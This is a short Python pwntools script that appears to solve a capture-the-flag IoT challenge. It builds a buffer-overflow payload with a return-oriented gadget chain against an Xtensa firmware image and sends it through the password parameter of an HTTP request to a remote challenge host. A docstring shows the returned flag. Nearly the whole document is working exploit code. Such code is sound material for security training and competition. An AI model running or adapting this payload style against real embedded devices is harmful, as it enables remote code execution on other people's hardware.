#!/usr/bin/env python3

from pwn import *
from pprint import pprint
e = ELF("./challenge.ino.elf_redacted")
port=80

targ = ("iot105fja983j.wpictf.xyz",80)



#wificlient was at 0x3fffff80
wificlient = 0x3fffff80
wifione = 0x11111111
wifitwo = wificlient-wifione

loada2 = 0x401059e6
adda2 = 0x4021b8b2


goal=e.symbols['_Z9send_flagR10WiFiClient']
goalone = 0x11111111
goaltwo = goal-goalone

adda15=0x4022d139
calla15 = 0x4022987c



print("wificlient {}\n wifione {}\n wifitwo{}\n".format(hex(wificlient),hex(wifione), hex(wifitwo)))
print("goal {}\n goalone {}\n goaltwo{}\n".format(hex(goal),hex(goalone), hex(goaltwo)))



NEXT=0x22222222

pw = b"A"*32 +\
    p32(goalone, endian='little') +\
    p32(goaltwo, endian='little') +\
    p32(wifitwo, endian='little') +\
    p32(loada2, endian='little') +\
    b"AAAA" +\
    p32(adda2, endian='little') +\
    p32(wifione, endian='little') +\
    b"dddd" +\
    b"EEEE" +\
    p32(adda15, endian='little') +\
    b"ffff" +\
    b"gggg" +\
    b"HHHH" +\
    p32(calla15, endian='little')
#    b"jjjj" +\
#    b"kkkk"


print(len(pw))

pprint(pw)
#pw = b"A"*44


r = remote(targ[0], targ[1])

r.sendline(b'GET /check_password?password=' + pw + b'\r\n\r\n')
r.interactive()

"""
<!DOCTYPE HTML><html>Incorrect! No light 4u!!!</html>


HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE HTML><html>WPI{iotisbaddontuseiot}</html>


[*] Got EOF while reading in interactive
"""